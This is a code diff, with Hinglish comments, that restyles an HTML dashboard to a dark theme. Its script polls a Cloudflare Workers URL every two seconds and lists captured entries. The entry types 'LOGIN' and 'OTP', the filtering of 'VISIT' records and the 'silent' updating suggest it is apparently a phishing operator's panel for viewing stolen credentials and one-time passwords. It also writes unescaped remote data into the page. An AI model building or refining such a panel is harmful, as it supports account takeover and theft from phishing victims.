@@ -3,15 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Smart Dashboard</title>
+    <title>Dark Dashboard</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
-        body { background-color: #f8f9fa; color: #333; }
+        
+        /* Poora background black */
+        body { background-color: #000000; color: #ffffff; }
 
-        /* Fixed Header */
+        /* Header: Black & Silver */
         .header {
-            background: #315195;
-            color: white;
+            background: #1a1a1a;
+            color: #ffffff;
             padding: 15px 20px;
             display: flex;
             justify-content: space-between;
@@ -19,58 +21,58 @@
             position: sticky;
             top: 0;
             z-index: 1000;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-bottom: 1px solid #333;
         }
-        .header h1 { font-size: 16px; font-weight: 600; }
+        .header h1 { font-size: 14px; font-weight: 700; text-transform: uppercase; letter-spacing: 2px; color: #888; }
         
+        /* White Badge for Count */
         .v-badge {
-            background: #ff9800;
-            padding: 4px 15px;
-            border-radius: 20px;
-            font-weight: 800;
-            font-size: 18px;
+            background: #ffffff;
+            color: #000000;
+            padding: 2px 15px;
+            border-radius: 4px;
+            font-weight: 900;
+            font-size: 20px;
         }
 
-        .container { padding: 10px; display: flex; flex-direction: column; gap: 8px; }
+        .container { padding: 10px; display: flex; flex-direction: column; gap: 10px; }
 
-        /* Clean Data Row */
+        /* Rows: Pure Black & White */
         .data-row {
-            background: #fff;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
-            border-left: 5px solid #315195;
-            font-size: 16px;
-            font-weight: 700;
-            line-height: 1.5;
+            background: #111111;
+            padding: 18px;
+            border-radius: 4px;
+            border: 1px solid #333;
+            /* Side line ko bhi white rakha hai for B&W look */
+            border-left: 4px solid #ffffff; 
+            font-size: 18px;
+            font-weight: 600;
+            color: #eeeeee;
             white-space: pre-wrap;
             word-break: break-all;
         }
 
-        .card-login { border-left-color: #28a745; }
-        .card-otp { border-left-color: #ff9800; }
-
-        /* Live Smooth Indicator */
-        .sync-text { text-align: center; font-size: 10px; color: #bbb; margin-top: 15px; }
+        /* Status Text */
+        .status-text { text-align: center; font-size: 10px; color: #444; margin-top: 20px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>LIVE ACTIVITY</h1>
+        <h1>Live Feed</h1>
         <div class="v-badge" id="vCount">0</div>
     </div>
 
     <div class="container" id="logsDisplay">
         </div>
 
-    <div class="sync-text">Updating data silently...</div>
+    <div class="status-text">Encrypted Connection Active</div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
-        let lastDataHash = ""; 
+        let oldHash = "";
 
-        async function updateData() {
+        async function refreshData() {
             try {
                 const res = await fetch(workerURL);
                 const data = await res.json();
@@ -78,39 +80,29 @@
                 const display = document.getElementById('logsDisplay');
                 const badge = document.getElementById('vCount');
 
-                // JSON string check taaki blink na ho agar data same hai
-                const currentHash = JSON.stringify(data);
-                if (currentHash === lastDataHash) return; 
-                lastDataHash = currentHash;
+                const newHash = JSON.stringify(data);
+                if (newHash === oldHash) return;
+                oldHash = newHash;
 
-                if (!data || data.length === 0) {
-                    display.innerHTML = "";
-                    badge.innerText = "0";
-                    return;
-                }
+                if (!data) return;
 
-                // Update Counter
+                // Total rows count
                 badge.innerText = data.length;
 
-                // Render Only Data (No Time, No Extra Text)
+                // Render Clean Data (Visit ignore, Data show)
                 display.innerHTML = data.map(log => {
-                    let typeClass = "";
-                    if(String(log.type).includes("LOGIN")) typeClass = "card-login";
-                    if(String(log.type).includes("OTP")) typeClass = "card-otp";
-
-                    return `
-                        <div class="data-row ${typeClass}">${log.detail}</div>
-                    `;
+                    if (log.detail === "COUNT" || log.type.includes("VISIT")) {
+                        return ""; 
+                    }
+                    // B&W theme mein sirf ek hi style rakha hai clean look ke liye
+                    return `<div class="data-row">${log.detail}</div>`;
                 }).join('');
 
-            } catch (e) {
-                console.log("Silent update failed");
-            }
+            } catch (e) { console.log("Updating..."); }
         }
 
-        // Fast Refresh (2 seconds) bina kisi blink ke
-        setInterval(updateData, 2000);
-        window.onload = updateData;
+        setInterval(refreshData, 2000);
+        window.onload = refreshData;
     </script>
 </body>
 </html>
